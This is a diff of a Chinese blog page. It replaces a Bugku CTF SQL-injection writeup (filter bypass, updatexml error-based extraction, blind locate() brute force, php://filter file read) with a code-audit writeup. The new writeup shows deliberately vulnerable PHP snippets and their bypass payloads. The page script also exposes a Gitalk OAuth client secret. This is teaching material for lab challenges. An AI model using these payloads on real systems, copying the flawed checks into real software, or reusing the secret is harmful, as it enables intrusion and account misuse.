@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <title>多次 &mdash; Evil</title>
+    <title>Bugku writeup(代码审计) &mdash; Evil</title>
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-markdown/dist/user-content.min.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css">
@@ -23,29 +23,29 @@
     
 
     
-    <link rel="canonical" href="http://localhost:4000/2018/08/03/bk_dc/">
+    <link rel="canonical" href="http://localhost:4000/2018/11/20/bk_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
     <link rel="alternate" type="application/atom+xml" title="Evil" href="http://localhost:4000/feed.xml">
     
     <link rel="shortcut icon" href="http://localhost:4000/images/favicon.ico" >
     
-    <meta property="og:title" content="多次">
+    <meta property="og:title" content="Bugku writeup(代码审计)">
       
     <meta name="keywords" content="Web Security">
     <meta name="og:keywords" content="Web Security">
       
-    <meta name="description" content="今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。">
-    <meta name="og:description" content="今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。">
+    <meta name="description" content="Bugku 上代码审计的题目，在这里记录一下解题的一些 tips 和 tricks……">
+    <meta name="og:description" content="Bugku 上代码审计的题目，在这里记录一下解题的一些 tips 和 tricks……">
       
     
     
         
     
-    <meta property="og:url" content="http://localhost:4000/2018/08/03/bk_dc/">
+    <meta property="og:url" content="http://localhost:4000/2018/11/20/bk_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
     <meta property="og:site_name" content="Evil">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
     
-    <meta property="article:published_time" content="2018-08-03">
+    <meta property="article:published_time" content="2018-11-20">
     
     <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script>
     <script src="http://localhost:4000/assets/js/jquery-ui.js"></script>
@@ -77,16 +77,16 @@
     </header>
     <!-- / header -->
 
-    <section class="collection-head small geopattern" data-pattern-id="多次">
+    <section class="collection-head small geopattern" data-pattern-id="Bugku writeup(代">
 <div class="container">
   <div class="columns">
     <div class="column three-fourths">
       <div class="collection-title">
-        <h1 class="collection-header">多次</h1>
+        <h1 class="collection-header">Bugku writeup(代码审计)</h1>
         <div class="collection-info">
           
           <span class="meta-info">
-            <span class="octicon octicon-calendar"></span> 2018/08/03
+            <span class="octicon octicon-calendar"></span> 2018/11/20
           </span>
           
           
@@ -113,195 +113,147 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <p>今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。</p>
+    <p>Bugku 上代码审计的题目，在这里记录一下解题的一些 tips 和 tricks……</p>
 
 <!--more-->
 
-<h2 id="0x01-题目">0x01 题目</h2>
+<h2 id="1extract变量覆盖">1.extract变量覆盖</h2>
 
-<p><a href="http://ctf.bugku.com/challenges">题目链接</a></p>
-
-<p><img src="http://localhost:4000/images/blog/bk_dc1.png" alt="多次" /></p>
-
-<h2 id="0x02-第一个-flag">0x02 第一个 flag</h2>
-
-<p><strong>step1: 老规矩，首先就是找注入点</strong></p>
-
-<p><code class="highlighter-rouge">/1ndex.php?id=1'</code> 报错，怀疑这里存在注入点(注意：这里注释要用<code class="highlighter-rouge">%23</code>不能用<code class="highlighter-rouge">#</code> [为什么？我暂时不知道，猜测是可能存在某种转码的问题⭐️] )</p>
-
-<p><strong>step2: 按照步骤此时判断字段数</strong></p>
-
-<p><code class="highlighter-rouge">/1ndex.php?id=1' order by 4%23</code> 报错，然后又试了很多其他数字发现都是报错，此时猜测可能过滤了某些字符</p>
-
-<p><strong>step2.1: 判断过滤了哪些字符</strong></p>
-
-<p><code class="highlighter-rouge">/1ndex.php?id=1'^(length('union')&gt;0)%23</code>  不报错。</p>
-
-<p>这里是通过异或语句来判断过滤了哪些字符，当不报错，那么说明 <code class="highlighter-rouge">(length('union')&gt;0)</code> 是错的，也就是 <code class="highlighter-rouge">union</code> 被过滤了。用同样的方法去判断有哪些我们需要用到的字符或单词被过滤了，这里要注意一下当  <code class="highlighter-rouge">or</code> 被过滤，那么<code class="highlighter-rouge">order</code> 也会被影响。
-通过测试最终发现<code class="highlighter-rouge">select union or and</code> 都被过滤了，<code class="highlighter-rouge">limit from</code>没有被过滤。</p>
-
-<p><strong>step2.2: 继续判断字段数</strong></p>
-
-<p><code class="highlighter-rouge">/1ndex.php?id=1' order by 2%23</code> 不报错，字段数为 2</p>
-
-<p><strong>step3: 查找目标数据的老套路了</strong></p>
-
-<p>这里直接给最后一个 payload</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1ndex.php?id=-1%27 ununionion seselectlect 1,flag1 from flag1%23
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$flag</span><span class="o">=</span><span class="s1">'xxx'</span><span class="p">;</span>
+<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$shiyan</span><span class="p">))</span>
+<span class="p">{</span>
+<span class="nv">$content</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$shiyan</span><span class="o">==</span><span class="nv">$content</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">echo</span><span class="s1">'flag{xxx}'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+<span class="k">echo</span><span class="s1">'Oh.no'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>得到第一个 flag</p>
-
-<p>这个在查找字段的时候还找到一个字段的时候，还找到一个 <code class="highlighter-rouge">address</code>字段</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/1ndex.php?id=-1%27 ununionion seselectlect 1,address from flag1%23
-</code></pre></div></div>
-
-<p>得到第二关的地址</p>
-
-<h2 id="0x02-第二个-flag">0x02 第二个 flag</h2>
-
-<p>这里有两种方法来得解这题</p>
-
-<h3 id="1解法一updatexml-报错注入">1.解法一：updatexml 报错注入</h3>
-
-<p>这里继续使用之前的方法是没法绕过的，所以要尝试新方法<code class="highlighter-rouge">updatexml 报错注入</code> (为什么要用这个？暂时不知道⭐️)</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UPDATEXML (XML_document, XPath_string, new_value);  
-第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc  
-第二个参数：XPath_string (Xpath格式的字符串)。  
-第三个参数：new_value，String格式，替换查找到的符合条件的数据  
-作用：改变文档中符合条件的节点的值
-</code></pre></div></div>
+<p>代码审计签到题</p>
 
 <p><strong>payload:</strong></p>
 
-<p>step1: 查询表名</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?shiyan=&amp;flag=1
 </code></pre></div></div>
 
-<p><code class="highlighter-rouge">0x7e</code> —&gt; <code class="highlighter-rouge">~</code></p>
+<p>这里注意一下: <code class="highlighter-rouge">url</code> 上<code class="highlighter-rouge">shiyan</code> 是空，但是我们再代码中将其打印出来是 <code class="highlighter-rouge">var_dump($shiyan) =&gt; string(0) ""</code>。</p>
 
-<p><strong>注意：这里 <code class="highlighter-rouge">group_concat()</code> 是因为回显不止一行，此时报错的信息为 <code class="highlighter-rouge">Subquery returns more than 1 row</code></strong></p>
+<h2 id="2strcmp比较字符串">2.strcmp比较字符串</h2>
 
-<p>这里提交的是<code class="highlighter-rouge">~sql语句~</code>，是不符合xml格式的，所以会报错。报错会造成 <code class="highlighter-rouge">select group_concat(table_name) from information_schema.tables where table_schema=database()</code>语句的执行，所以可以注入。</p>
-
-<p>此时回显：</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
-Nobody!
-XPATH syntax error: '~class,flag2~'
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"flag</span><span class="si">{</span><span class="nv">xxxxx</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。
+//比较两个字符串（区分大小写）
+</span><span class="k">die</span><span class="p">(</span><span class="s1">'Flag: '</span><span class="o">.</span><span class="nv">$flag</span><span class="p">);</span>
+<span class="k">else</span>
+<span class="k">print</span> <span class="s1">'No'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>下面其实都是按照老套路来了，重点上面基本都讲完了。</p>
+<p>还是签到题 :<code class="highlighter-rouge">strcmp</code> 弱比较问题</p>
 
-<p>step2: 查询字段名</p>
+<p><strong>payload：</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)%23
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?a[]=1
 </code></pre></div></div>
 
-<p>此时回显：</p>
+<h2 id="3urldecode二次编码绕过">3.urldecode二次编码绕过</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)#
-Nobody!
-XPATH syntax error: '~flag2,address~'
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">"hackerDJ"</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">echo</span><span class="p">(</span><span class="s2">"
+
+not allowed!
+
+"</span><span class="p">);</span>
+<span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]);</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"hackerDJ"</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">echo</span> <span class="s2">"
+Access granted!
+
+"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"
+flag
+
+"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>step3: 查询目标数据</p>
+<p>还是签到题，题目即答案。</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23
+<p>直接在 url 上输入 urlencode 之后的数据，后端 php 代码获取到的是一次 url 解码之后的数据，所以对于一次 urldecode 需要两次 urlencode。</p>
+
+<h2 id="4md5函数">4.md5()函数</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s1">'flag{test}'</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="k">and</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span>
+<span class="k">print</span> <span class="s1">'Your password can not be your username.'</span><span class="p">;</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span>
+<span class="k">die</span><span class="p">(</span><span class="s1">'Flag: '</span><span class="o">.</span><span class="nv">$flag</span><span class="p">);</span>
+<span class="k">else</span>
+<span class="k">print</span> <span class="s1">'Invalid password'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>此时回显：</p>
+<p>还是签到题</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)#
-Nobody!
-XPATH syntax error: '~flag{Bugku-sql_*******-bug}~'
+<p><code class="highlighter-rouge">PHP</code>对数组进行<code class="highlighter-rouge">hash</code>计算都会得出<code class="highlighter-rouge">null</code>的空值</p>
+
+<p><strong>payload：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?username[]=1&amp;password[]=2
 </code></pre></div></div>
 
-<p>此时已经搞到答案了，将<code class="highlighter-rouge">B</code> 改成<code class="highlighter-rouge">b</code> 就是正确的 flag 了。</p>
+<h2 id="5数组返回null绕过">5.数组返回NULL绕过</h2>
 
-<p><strong>但是呢，这里还有第三关，本着探究的目的，稍后在第三节会继续深入。</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"flag"</span><span class="p">;</span>
 
-<p>查询第三关地址:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span> <span class="p">(</span><span class="s2">"^[a-zA-Z0-9]+$"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span>
+<span class="k">echo</span> <span class="s1">'You password must be alphanumeric'</span><span class="p">;</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="s1">'--'</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
+<span class="k">die</span><span class="p">(</span><span class="s1">'Flag: '</span> <span class="o">.</span> <span class="nv">$flag</span><span class="p">);</span>
+<span class="k">else</span>
+<span class="k">echo</span> <span class="s1">'Invalid password'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>此时回显：</p>
+<p><strong>payload：</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My Id =1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)#
-Nobody!
-XPATH syntax error: '~./Have_Fun.php~'
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?password[]=1
 </code></pre></div></div>
 
-<p>获取到第三关地址，第三关稍后再说。</p>
-
-<h3 id="2解法二locate--脚本暴破">2.解法二：locate() + 脚本暴破</h3>
-
-<p><code class="highlighter-rouge">sleep  substr</code>都被过滤掉了，我们转而使用 <code class="highlighter-rouge">locate</code> 函数达到同样的效果。</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>语法一:
-locate(substr,str)
-返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0。
-eg:
-locate('jd','jdgood')=1
-注意: 下标从 1 开始
-
-语法二:
-locate(substr,str,pos)
-返回子串 substr 在字符串 str 中第一次出现的位置,从位置 pos 开始。
-eg:
-mysql&gt; select locate('bar', 'foobarbar', 5);
-mysql&gt; 7
-</code></pre></div></div>
-
-<p>根据 locate 上述语法特性就可以构造 payload 了。</p>
-
-<p><strong>payload</strong></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url = "/Once_More.php?id=1'and  (select locate(binary'"+str(j)+"',(select flag2 from flag2),"+str(i)+"))="+str(i)+"%23"
-</code></pre></div></div>
-
-<p>按照 SQL 注入的老套路来进行暴破就可以了，最终可以得到 flag。</p>
-
-<h2 id="0x03-第三个-flag">0x03 第三个 flag</h2>
-
-<p><strong>tips:</strong></p>
-
-<p>XXF 绕过第一个问题</p>
-
-<p>之后会得到一个二维码，扫描之后得到</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>你……你……你可以看到我?
-好吧，我来自于ErWeiMa.php
-顺便告诉你两个密码
-one:参数名是game;
-tow:flag在admin里
-对了,文件后@…c=Y&amp;$as%_=#*ad…*@#！*&amp;@…c……
-</code></pre></div></div>
-
-<p>根据得到的信息构造 <strong>payload</strong></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /Have_Fun.php 
-
-game=php://filter/convert.base64-encode/resource=admin.php
-</code></pre></div></div>
-
-<p>得到第三个 flag，直接提交就可以了。</p>
-
+<p>这里是数组的话，<code class="highlighter-rouge">ereg ("^[a-zA-Z0-9]+$", $_GET['password'])</code>  返回的是 <code class="highlighter-rouge">NULL</code></p>
 
     </article>
   
     <div class="newold">
   <hr>
   
-  <b>上一篇: <a href="/2018/08/01/sql_injection1/">SQL注入的套路</a></b><br>
+  <b>上一篇: <a href="/2018/11/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS/">XSS姿势-文件上传XSS</a></b><br>
      
   
-  <b>下一篇: <a href="/2018/08/05/bk_login3/">login3(SKCTF)</a></b>
+  <b>下一篇: <a href="/2018/11/20/%E5%AE%9E%E9%AA%8C%E5%90%A7web/">实验吧-简单登录(CBC)</a></b>
    
 </div><!--上一篇 下一篇-->
 
@@ -319,7 +271,7 @@ game=php://filter/convert.base64-encode/resource=admin.php
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/2018/08/03/bk_dc/',
+            id: '/2018/11/20/bk_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A',
             clientID: '5a59fdc570f933e0c2ee',
             clientSecret: '4bfb41f4315d6e67dc7d994890a4fc8bf9dee142',
             repo: 'blogcomments',
